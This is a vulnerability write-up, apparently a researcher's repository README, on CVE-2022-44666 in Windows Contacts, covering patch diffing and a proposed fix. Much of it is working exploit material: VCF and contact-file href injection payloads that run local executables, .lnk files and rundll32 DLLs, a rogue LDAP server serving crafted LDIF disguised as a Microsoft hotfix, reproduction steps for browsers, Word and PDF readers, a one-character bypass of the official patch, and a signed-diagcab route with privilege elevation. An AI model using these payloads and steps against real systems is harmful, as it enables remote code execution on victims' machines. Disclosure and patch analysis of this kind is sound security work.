# Microsoft Windows Contacts (VCF/Contact/LDAP) syslink control href attribute escape vulnerability (CVE-2022-44666) (0day).

This is the story about another forgotten 0day fully disclosed more than 4 years ago by [John Page (aka hyp3rlinx)][R.1]. To understand the report, you have to consider i'm stupid :-) And my stupidicity drives me to take longer paths to solve simple issues, but it also leads me to figure out another ways to exploit some bugs. Why do i say this? Because i was unable to quickly understand that the way to create a .contact file is just browsing to Contact folder in order to create the contact, instead of that, i used this info to first create a VCF file and then, i wrongly thought that this was some type of variant. That was also because of my brain can't understand some 0days are forgotten for so long time ¯\\_(ツ)_/¯ Once done that and after the "wontfix" replies by [MSRC][R.2] and [ZDI][R.3], further investigations were made to increase the severity, finally reaching out .contact files and windows url protocol handler "ldap".

## Details

+ **Vendor**: Microsoft.
+ **App**: Microsoft Windows Contacts.
+ **Version**: 10.0.19044.1826.
+ **Tested systems**: Windows 10 & Windows 11.
+ **Tested system versions**: Microsoft Windows [Version 10.0.19044.1826] & Microsoft Windows [Version 10.0.22000.795]

## Intro

While i was reading the exploit code for [this vulnerability][R.4] which was actually released as 0day and it's possible to find [ZDI's report][R.5].

***Update 2022/07/21**: After reporting this case to MS, MSRC's folks rightly pointed me out Windows Contacts isn't the default program to open VCF files.* 

![alt text](<./images/msrc-reply-vcf-opened-non-default-program.png>)

*Further research still demonstrates the default program for VCF files on Win7 ESU & WinServer2019 is Windows Contacts (wab.exe), otherwise MS People (PeopleApp.exe) is used. Here is a full table of this testing:*

+ *Windows 7: Default program for VCF files is Windows Contacts (wab.exe).*
+ *Windows Server 2019: Default program for VCF files is Windows Contacts (wab.exe).*
+ *Windows 10: Default program for VCF files is MS People (PeopleApp.exe).*
+ *Windows 10 + MS Office: Default program for VCF files is MS Outlook (outlook.exe).*
+ *Windows 11: Default program for VCF files is MS People (PeopleApp.exe).*

*Anyway they still argue there's some social engineering involved such as opening a crafted VCF file and clicking on some links to exploit the bug so doesn't meet the MSRC bug bar for a security update.*

![alt text](<./images/msrc-reply-se-attack-not-meet-sec-update.png>)

***Update 2022/07/25**: Well, after further research, it's the same bug. I've been finally able to find a .contact proof of concept. It's actually possible to correctly parse a .contact file using HTML entities. Note this solves the previous issue (***Update 2022/07/21***) and this file format (.contact) is opened by Windows Contacts, default program for this file extension, even when MS Office is installed in the system. It just needs a first file association if hasn't yet been done, but the only program installed by default to do that is Windows Contacts.*

***Update 2022/07/25**: This further research made me to reach a point that i was trying to reach some time ago: Use some URL protocol handler to automatically open crafted contact data to exploit the bug. I was finally able to get it working thanks to ldap uri scheme, which is associated by default to Windows Contacts application, so just setting a rogue LDAP server up and serving the payload data under mail, url or wwwhomepage attributes, the exploiting impact is increased because now it's not needed to double click a malicious VCF/Contact file, we can deliver this using url protocols.*

***Update 2023/02/08**: As a gesture of goodwill by MSRC, [John Page (aka hyp3rlinx)][R.1] has been included in the acknowledgement page for [CVE-2022-44666][R.10] discovery.*

## Description

The report basically is the same than above links, however i've improved a bit the social engineering involved. In fact, the first thing that i made was to improve the way the links are seen, just like it were a XSS vulnerability, it's actually an HTML injection so it's possible to close the first anchor element and insert a new one. Then, i wanted to remove the visibility for those HTML elements so just setting as long "innerHTML" as possible would be enough to hide them (because of there are char limits).

This is the final payload used:

```html
URL;WORK:"></a><a href="notepad">CLICKMEEEEE...</a>
```

To watch what happens, run procmon and setup a fake target of href attribute like this:

```html
URL;WORK:"></a><a href="foo.exe">CLICKMEEEEE...</a>
```

Once clicked the link, an output like this is observed in procmon:

And the involved pseudo-code is the next:

```cpp
_int64 __fastcall fnSummaryProc(HWND hWnd, int a2, WPARAM a3, LONG_PTR a4)
{

...

      default:
        if ( !((v22 + 4) & 0xFFFFFFFD) && *(_WORD *)(v5 + 136) )
          SafeExecute(v7, (const unsigned __int16 *)v9, (const unsigned __int16 *)(v5 + 136)); <== FOLLOW THIS PATH
        break;
    }
  }
  return 1i64;
}


__int64 __fastcall SafeExecute(HWND a1, const unsigned __int16 *a2, const unsigned __int16 *a3)
{

  v3 = a3;
  v4 = a1;
  memset_0(Dst, 0, 0x1048ui64);
  pcchCanonicalized = 2084;
  v5 = UrlCanonicalizeW(v3, Dst, &pcchCanonicalized, 0);
  if ( (v5 & 0x80000000) == 0 )
  {
    v6 = UrlIsW(Dst, URLIS_FILEURL);
  pExecInfo.hProcess = 0i64;
      pExecInfo.hwnd = 0i64;
      pExecInfo.lpVerb = 0i64;
      _mm_store_si128((__m128i *)&pExecInfo.lpParameters, (__m128i)0i64);
      *(_OWORD *)&pExecInfo.hInstApp = 0i64;
      *(_OWORD *)&pExecInfo.lpClass = 0i64;
      *(_OWORD *)&pExecInfo.dwHotKey = 0i64;
      if ( !ShellExecuteExW(&pExecInfo) ) <== CALL HERE
      {
        v10 = GetLastError();
        v5 = (unsigned __int16)v10 | 0x80070000;
        if ( v10 <= 0 )
          v5 = v10;
      }
  }
  ...
}
```

After this, it's clear the issue actually involves [SysLink controls in comctl32.dll library][R.6] and how the href attribute is parsed by wab32.dll library.

It isn't possible to use remote shared locations or webdavs to exploit this.

```html
URL;WORK:"></a><a href="\\127.0.0.1@80\test\payload.exe">CLICKMEEEEE...</a>
URL;WORK:"></a><a href="\\vboxsvr\test\payload.exe">CLICKMEEEEE...</a>
```

The file info is queried but is never executed.

![alt text](<./images/href-attribute-remote-loc.png>)

It's possible to use relative paths such as:

```html
URL;WORK:"></a><a href="foo\foo.exe">CLICKMEEEEE...</a>
```

![alt text](<./images/href-attribute-relative-path.png>)

Example:

```html
URL;WORK:"></a><a href="hidden\payload.exe">CLICKMEEEEE...</a>
```

![alt text](<./images/href-attribute-relative-exec-payload.png>)

Just going further and while testing rundll32 as attack vector, just noticed it was not possible to use arguments with the payload executable selected. However using a lnk file which targets a chosen executable, it was possible to use cmdline arguments. It's a bit tricky but it works.

```html
URL;WORK:"></a><a href="hidden\run.lnk">CLICKMEEEEE...</a>
```

Target of run.lnk: 

```
rundll32.exe hidden\payload.bin,Foo"
```

![alt text](<./images/href-attribute-relative-lnk-payload.png>)

This looks more interesting because it's not needed to drop an executable in the target system.


## Impact

Remote Code Execution as the current user logged.


## Proofs of Concept

It has to exist file association to use Windows Contacts to open .vcf files.

***Update 2021/07/25**: For Contact files (.contact) there is only one application to open them by default: Windows Contacts, even when MS Office is installed in the target system.*

Using files located in [./report-pocs/](./report-pocs/):

1. Double-click the file [exploit.vcf](./report-pocs/exploit.vcf) (***Update 2021/07/25***: Or double-click the file [exploit.contact](./report-pocs/exploit.contact)).
2. Do single click in one of "click-me" links.
3. It launches notepad.exe using different ways to execution:
   - 3.1. Link 1: Run .lnk file that triggers rundll32 with a crafted library.
   - 3.2. Link 2: This triggers the execution of an executable located in folder "hidden" as a local path.
   - 3.3. Link 3: Directly.
   

There are a couple of videos attached in [./videos](./videos):

+ [./videos/simple-payload.gif](./videos/simple-payload.gif): This is an example to download a single vcf file and triggers the bug.

![alt text](<./videos/simple-payload.gif>)

+ [./videos/full-payload.gif](./videos/full-payload.gif): This is a more complex example which downloads a zip file that allows to trigger all the payloads.

![alt text](<./videos/full-payload.gif>)
   
This is a summary of the proof of concept files located in ./report-pocs/:

+ [./report-pocs/exploit.vcf](./report-pocs/exploit.vcf): Proof of concept to double-click it.
+ [./report-pocs/exploit.zip](./report-pocs/exploit.zip): Zipped file to be downloaded which includes all the tricks to exploit the bug (video: [full-payload.gif](./videos/full-payload.gif))
+ [./report-pocs/hidden/payload.lnk](./report-pocs/hidden/payload.lnk): LNK file to run the payload with cmdline arguments.
+ [./report-pocs/hidden/payload.bin](./report-pocs/hidden/payload.bin): DLL payload. It finally runs notepad.exe
+ [./report-pocs/hidden/payload.exe](./report-pocs/hidden/payload.exe): Executable payload. It finally runs notepad.exe


And files located in [./src](./src):

+ [dllmain.cpp](./src/dllmain.cpp): DLL library used as payload (payload.bin).
+ [payload.cpp](./src/payload.cpp): Executable used as payload (payload.exe).


## Further exploitation

For further exploitation and as the vulnerability doesn't allow to load remote shared location files, uri protocol "search-ms" is an interesting vector. You'll find proofs of concept which only trigger a local binary like calc or notepad and more complex proofs of concept that i've named as weaponized exploit, because of they don't execute local files. These pocs & exploits are located in [./further-pocs/](./further-pocs/).

This is a summary of target applications:

* Browsers: MS Edge, Google Chrome, Mozilla Firefox & Opera. Note uri protocol "search-ms" is [disabled for Mozilla Firefox at the time of writing this write-up][R.7].
* MS Word.
* PDF Readers (mainly Adobe Acrobat Reader DC & Foxit PDF Reader).

In order to reproduce:

1. Setup a remote shared location (SMB or WebDav). Copy content of [./further-pocs/to-copy-in-remote-shared-location/](./further-pocs/to-copy-in-remote-shared-location/) into it.
2. If wanted, hide the files running [./further-pocs/to-copy-in-remote-shared-location/setup-hidden.bat](./further-pocs/to-copy-in-remote-shared-location/setup-hidden.bat).
3. Modify file exploit.html/poc.html located in ./further-pocs/[vector or target app]/remote-weaponized-by-searchms/ to point to your remote shared location.
4. Start a webserver in the target app path, that is: ./further-pocs/[vector or target app]/[poc||remote-weaponized-by-searchms]/.
5. Run poc/exploit files depending on the case.
6. For further info, watch the videos located in [./videos](./videos):

## Contact Files

After receiving ***Update 2022/07/21*** from MSRC's, i decided to take a look into Contact file extension as it would confirm whether or not it's the same case as that found by the original discoverer, and of course it is. My first proof of concept was just using a different file format, but the bug is the same. Just using wabmig.exe located in "C:\Program Files\Windows Mail" is possible to convert all the VCF files to Contact files.

![alt text](<./images/convert-vcf-to-contact-wabmig.png>)

And as mentioned in the intro updates, these files are opened by Windows Contacts (default program).

The steps to reproduce are the same than those used for VCF files. Same restrictions observed on VCF files are applied with Contact files, that is, it's not possible to use remote shared locations for the attribute "href" but it's still possible to use local paths or url protocol "search-ms".

These are all the files added or modified to exploit Contact files:

+ [./further-pocs/browsers/poc/KB5014666-hotfix.vcf](./further-pocs/browsers/poc/KB5014666-hotfix.vcf): Simple payload which executes local binaries using VCF format.
+ [./further-pocs/browsers/poc/KB5014666-hotfix.contact](./further-pocs/browsers/poc/KB5014666-hotfix.contact): Simple payload which executes local binaries using Contact format.

+ [./report-pocs/exploit.contact](./report-pocs/exploit.contact): Same file than exploit.VCF in Contact file format.


## URL protocol LDAP

As mentioned above, this further research made me to reach a point that i was trying to reach some time ago: Use some URL protocol handler to automatically open crafted contact data to exploit the bug. This challenge was finally achieved thanks to ldap uri scheme.


```js
...
Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\LDAP]
@="URL:LDAP Protocol"
"EditFlags"=hex:02,00,00,00
"URL Protocol"=""

[HKEY_CLASSES_ROOT\LDAP\Clsid]
@="{228D9A81-C302-11cf-9AA4-00AA004A5691}"

[HKEY_CLASSES_ROOT\LDAP\shell]

[HKEY_CLASSES_ROOT\LDAP\shell\open]

[HKEY_CLASSES_ROOT\LDAP\shell\open\command]
@=hex(2):22,00,25,00,50,00,72,00,6f,00,67,00,72,00,61,00,6d,00,46,00,69,00,6c,\
  00,65,00,73,00,25,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,\
  4d,00,61,00,69,00,6c,00,5c,00,77,00,61,00,62,00,2e,00,65,00,78,00,65,00,22,\
  00,20,00,22,00,2f,00,6c,00,64,00,61,00,70,00,3a,00,25,00,31,00,22,00,00,00
...
```

That is:

```
"%ProgramFiles%\Windows Mail\wab.exe" "/ldap:%1"
```

So just setting a rogue LDAP server up and serving the payload data, it's possible to use this url protocol handler to launch Windows Contacts (wab.exe) with a malicious payload in the ldif attributes mail, url or wwwhomepage. Note that i was unable to do this working on the attribute "wwwhomepage" as indicated [here][R.8], but it should theorically work.

The crafted ldif content is just something like this:


```html
...
dn: dc=org
dc: org
objectClass: dcObject

dn: dc=example,dc=org
dc: example
objectClass: dcObject
objectClass: organization

dn: ou=people,dc=example,dc=org
objectClass: organizationalUnit
ou: people

dn: cn=Microsoft,ou=people,dc=example,dc=org
cn: Microsoft
gn: Microsoft
company: Microsoft
title: Microsoft KB5001337-hotfix
mail:"></a><a href="..\hidden\payload.lnk">Run-installer...</a>
url:"></a><a href="..\hidden\payload.exe">Run-installer...</a>
wwwhomepage:"></a><a href="notepad">Run-installer...</a>
objectclass: top
objectclass: person
objectClass: inetOrgPerson
...
```

And the code for the rogue ldap server was taken borrowed from the quick start server of ldaptor project, located [over here][R.9].

This is a summary of target applications:

* Browsers: MS Edge, Google Chrome, Mozilla Firefox & Opera.
* MS Word.
* PDF Readers (mainly Adobe Acrobat Reader DC & Foxit PDF Reader).

The steps to reproduce are:

1. Copy [./further-pocs](./further-pocs) into remote shared location (SMB or WebDav).
2. If wanted, hide the files running [./further-pocs/MSWord/setup-hidden.bat](./further-pocs/MSWord/setup-hidden.bat).
3. Install ldaptor by pip: pip install ldaptor. Note this has been tested on Python 2.7 x64.
4. Start rogue ldap server located in [./further-pocs/ldap-rogue-server/ldap-server.py](./further-pocs/ldap-rogue-server/ldap-server.py)
5. Start a webserver in the target app path, that is: ./further-pocs/[vector or target app]/url-protocol-ldap/.
6. Run exploit files depending on the case.
7. For further info, watch the videos located in [./videos](./videos):
   - 7.1. For browsers: [./videos/ldap-browsers-exploit.gif](./videos/ldap-browsers-exploit.gif).

   ![alt text](<./videos/ldap-browsers-exploit.gif>)

   - 7.2. For MS Word: [./videos/ldap-msword-exploit.gif](./videos/ldap-msword-exploit.gif).

   ![alt text](<./videos/ldap-msword-exploit.gif>)

   - 7.3. For PDF Readers: [./videos/ldap-pdfreaders-exploit.gif](./videos/ldap-pdfreaders-exploit.gif).

   ![alt text](<./videos/ldap-pdfreaders-exploit.gif>)

These are the additional files to exploit url protocol ldap:

+ [./further-pocs/browsers/url-protocol-ldap/exploit.html](./further-pocs/browsers/url-protocol-ldap/exploit.html): HTML file to load url protocol ldap on a rogue ldap server which returns crafted data for mail and urls.
+ [./further-pocs/MSWord/url-protocol-ldap/poc.html](./further-pocs/MSWord/url-protocol-ldap/poc.html): remote template aka htmlfile activex to load url protocol ldap on a rogue ldap server which returns crafted data for mail and urls.
+ [./further-pocs/MSWord/url-protocol-ldap/exploit.rtf](./further-pocs/MSWord/url-protocol-ldap/exploit.rtf): Word file in format RTF which triggers a remote template aka htmlfile activex.
+ [./further-pocs/MSWord/url-protocol-ldap/exploit.docx](./further-pocs/MSWord/url-protocol-ldap/exploit.docx): Word file in format DOCX which triggers a remote template aka htmlfile activex.
+ [./further-pocs/PDFreaders/url-protocol-ldap/exploit.html](./further-pocs/PDFreaders/url-protocol-ldap/exploit.html): HTML file to load url protocol ldap on a rogue ldap server which returns crafted data for mail and urls.
+ [./further-pocs/PDFreaders/url-protocol-ldap/exploit.pdf](./further-pocs/PDFreaders/url-protocol-ldap/exploit.pdf): PDF which triggers defaul browser to execute uri protocol "ldap".
+ [./further-pocs/ldap-rogue-server/ldap-server.py](./further-pocs/ldap-rogue-server/ldap-server.py): Python script based on the server sample for ldaptor, which runs on Python 2.7, and serves the crafted data to exploit the bug through the ldif attributes mail, url and wwwhomepage.

## CVE-2022-44666: Patch analysis and incomplete fix

On Dec 13, 2022 the patch for this vulnerability was released by Microsoft as [CVE-2022-44666][R.10].

The versions used for diffing the patch (located in C:\Program Files\Common Files\System\wab32.dll) have been:

+ MD5: 588A3D68F89ABF1884BEB7267F274A8B (pre-patch)
+ MD5: D1708215AD2624E666AFD97D97720E81 (post-patch)

Diffing the affected library (wab32.dll) with [Diaphora][R.11] by [@matalaz][R.12], we'll find out some new functions:

![alt text](<./bypass/images/unmatched-diaphora-wab32dll.png>)

And these are the partial matches:

![alt text](<./bypass/images/partialmatches-diaphora-wab32dll.png>)

Taking a look into the new code in function "fnSummaryProc":

```cpp
__int64 __fastcall fnSummaryProc(HWND a1, int a2, WPARAM a3, LONG_PTR a4)
{

...

    if ( v26 <= 0x824 && (!v23 ? (v27 = 0) : (v27 = IsValidWebsiteUrlScheme(v23)), v27) )  // (1)
    {
      v38 = (unsigned __int16 *)2085;
      v39 = &CPercentEncodeRFC3986::`vftable';
      v40 = v23;
      v41 = v26;
      v28 = CPercentEncodeString::Encode(
              (CPercentEncodeString *)&v39,
              (unsigned __int16 *)&Dst,
              (unsigned __int64 *)&v38,
              v25);
      v29 = v7;
      if ( !v28 )
      {
        v30 = (const unsigned __int16 *)&Dst;
LABEL_44:
        SafeExecute(v29, v24, v30);  // (2)
        return 1i64;
      }
    }
    else
    {
      if ( v23 )
        v32 = IsInternetAddress(v23, &v38);
      else
        v32 = 0;
      v29 = v7;
      if ( v32 )
      {
        v30 = v23;
        goto LABEL_44; // (3)
      }
    }
    v31 = GetParent(v29);
    ShowMessageBox(v31, 0xFE1u, 0x30u); // (4)
    return 1i64;
  }
  ...
}
```
After the fix, the new code calls to the function "SafeExecute" (2) or show a message box (4).

![alt text](<./bypass/images/show-messagebox-wabexe.png>)

To reach the call of the funcion "SafeExecute" (2) is possible to follow the code flow in (1):

```cpp
_BOOL8 __fastcall IsValidWebsiteUrlScheme(LPCWSTR pszIn)
{
  const WCHAR *v1; // rbx
  _BOOL8 result; // rax
  DWORD pcchOut; // [rsp+30h] [rbp-68h]
  char Dst; // [rsp+40h] [rbp-58h]

  v1 = pszIn;
  result = 0;
  if ( UrlIsW(pszIn, URLIS_URL) ) // (5)
  {
    memset_0(&Dst, 0, 0x40ui64);
    pcchOut = 32;
    if ( UrlGetPartW(v1, (LPWSTR)&Dst, &pcchOut, 1u, 0) >= 0
      && (!(unsigned int)StrCmpICW(&Dst, L"http") || !(unsigned int)StrCmpICW(&Dst, L"https")) )  // (6)
    {
      result = 1;
    }
  }
  return result;
}
```

This function first checks if the [URL is valid in (5)][R.13], then, it checks whether or not it starts with "http" or "https" in (6). This code path looks safe enough. Coming back to the function "fnSummaryProc", there's another code path that could help to bypass the fix in (3).

```cpp
__int64 __fastcall IsInternetAddress(unsigned __int16 *a1, unsigned __int16 **a2)
{
  unsigned __int16 v2; // ax
  unsigned __int16 **v3; // r14
  unsigned __int16 *v4; // rdi
  unsigned __int16 *v5; // r15
  unsigned __int16 v6; // dx
  unsigned __int16 *v7; // r8
  unsigned __int16 *v8; // rcx
  WCHAR v9; // ax
  _WORD *v10; // rsi
  int v11; // ebp
  LPWSTR v12; // rax
  unsigned __int16 *v14; // rax

  v2 = *a1;
  v3 = a2;
  v4 = a1;
  v5 = a1;
  while ( v2 && v2 != 0x3C )
  {
    a1 = CharNextW(a1);
    v2 = *a1;
  }
  v6 = *a1;
  v7 = a1;
  if ( *a1 )
  {
    v8 = a1 + 1;
    v4 = v8;
  }
  else
  {
    v8 = v4;
  }
  v9 = *v8;
  v10 = (_WORD *)((unsigned __int64)v7 & -(__int64)(v6 != 0));
  v11 = v6 != 0;
  if ( *v8 & 0xFFBF )
  {
    while ( v9 <= 0x7Fu && v9 != 0xD && v9 != 0xA )
    {
      if ( v9 == 0x40 )  // (7)
      {
        v14 = CharNextW(v8);
        if ( !(unsigned int)IsDomainName(v14, v11, v3 != 0i64) )  // (8)
          return 0i64;
        if ( v3 )
        {
          if ( v10 )
          {
            *v10 = 0;
            TrimSpaces(v5);
          }
          *v3 = v4;
        }
        return 1i64;
      }
      v12 = CharNextW(v8);
      v8 = v12;
      v9 = *v12;
      if ( !v9 )
        return 0i64;
    }
  }
  return 0i64;
}
```

One thing caught my attention about this in (7), where the code is checking whether it exists a char "@". Then, it calls to the function "IsDomainName" in order to check whether or not the string after the char "@" is a domain name:

```cpp
__int64 __fastcall IsDomainName(unsigned __int16 *a1, int a2, int a3)
{
  int v3; // edi
  int v4; // ebx
  int v5; // er9
  __int64 v6; // rdx

  v3 = a3;
  v4 = a2;
  if ( !a1 )
    return 0i64;
LABEL_2:
  v5 = *a1;
  if ( !(_WORD)v5 || (_WORD)v5 == 0x2E || v4 && (_WORD)v5 == 0x3E )
    return 0i64;
  while ( (_WORD)v5 && (!v4 || (_WORD)v5 != 0x3E) )
  {
    if ( (unsigned __int16)v5 >= 0x80u )
      return 0i64;
    if ( (unsigned __int16)(v5 - 10) <= 0x36u )
    {
      v6 = 19140298416324617i64;
      if ( _bittest64(&v6, (unsigned int)(v5 - 10)) )
        return 0i64;
    }
    if ( (_WORD)v5 == 46 )
    {
      a1 = CharNextW(a1);
      if ( a1 )
        goto LABEL_2;
      return 0i64;
    }
    a1 = CharNextW(a1);
    v5 = *a1;
  }
  if ( v4 )
  {
    if ( (_WORD)v5 != 0x3E )
      return 0i64;
    if ( v3 )
      *a1 = 0;
  }
  return 1i64;
}
```

So the bypass for the fix is pretty simple. It's just necessary to use a single char "@". Symlink href attributes like these will successfully bypass the fix:

```html
hidden\@payload.lnk
hidden\@payload.exe
```

```html
hidden@payload.lnk
hidden@payload.exe
```

For further info, there's a video for a [standalone contact file](./bypass/videos/simple-payload.gif).

One day later the patch release, this information was sent to MSRC. Unfortunately, the case has been recently closed with no further info about it.

## Diagcab file as payload

After [CVE-2022-30190][R.14] also known as [Follina vulnerability][R.15] and [CVE-2022-34713][R.16] also known as [DogWalk vulnerability][R.17], a [publicly known but underrated technique][R.18] was reborn again thanks to [@buffaloverflow][R.19]. My mate and friend [Eduardo Braun Prado][R.20] gave me the idea to use this technique over here.

There are some pre-requirements to do this:

1. The target user has to belong to administrator group. If not, there's a UAC prompt.
2. The diagcab file has to be signed, so the codesigning certificate must have been installed in the target computer.

A real attack scenario would pass for stealing a code signing certificate which is in fact installed in the target system. But as this is just a proof of concept, a self-signed code signing certificate was generated and used to sign the diagcab file named as [@payload.diagcab](./bypass/diagcab-pocs/MSWord/hidden/@payload.diagcab). 

So in order to repro, it's needed to install the certificate located in [cert.cer](./bypass/diagcab-pocs/cert.cer) under Trusted Root Certificate Authority [like this](./bypass/videos/install-certificate.gif):

![alt text](<./bypass/videos/install-certificate.gif>)

To finally elevate the priveleges, a token stealing/impersonation could be used. In this case, ["parent process" technique][R.21] was the [chosen one][R.22]. A modified version for this script was included inside the resolver scripts.

For further info, there's a video for [MS Word and LDAP url protocol](./bypass/videos/ldap-msword-diagcab-exploit.gif).

![alt text](<./bypass/videos/ldap-msword-diagcab-exploit.gif>)

Proof of concept located in [./bypass/diagcab-pocs](./bypass/diagcab-pocs).

## Proposed fix

Remember the vulnerable code in the function "fnSummaryProc":

```cpp
...
LABEL_44:
        SafeExecute(v29, v24, v30); // Vulnerable call to shellexecute
        return 1i64;
      }
    }
    else
    {
      if ( v23 )
        v32 = IsInternetAddress(v23, &v38); // Bypass with a single "@"
      else
        v32 = 0;
      v29 = v7;
      if ( v32 )
      {
        v30 = v23;
        goto LABEL_44;
      }
    }
...
```

The function "IsInternetAddress" was intentionally created to check if the href attr corresponds to any email address. So my proposed fix (and following the imported functions that the library uses) would be:

```cpp
...
      if (v32 && !(unsigned int)StrCmpNICW(L"mailto:", v23, 7i64)) // Check out the href really starts with "mailto:"
      {
          v30 = v23;
          goto LABEL_44;
      }
...
```

So simple like this, it's only needed to check this out before calling to "SafeExecute". Just testing if the target string (v23) starts with "mailto:", the bug would be fully fixed IMHO.

## Unofficial fix

Some days/weeks ago when i contacted [@mkolsek][R.25] of [0patch][R.23] to inform him about this issue,  who by the way is always very kind to me, told me this has been receiving [an unofficial fix for Windows 7 since then][R.24] (4 years ago). That was a surprise and good news!

It was tested and successfully stopped the new variant of CVE-2022-44666. The micropatch prepends "http://" to the attacker-controlled string passed by the href attr if doesn't start with "mailto:", "http://" or "https://", which is enough to fully fix the issue. Now it's going to be extended for the latest Windows versions, only necessary to update some offsets.

![alt text](<./videos/micropatch-0patch.gif>)

Either way, it would be better to get an official patch.
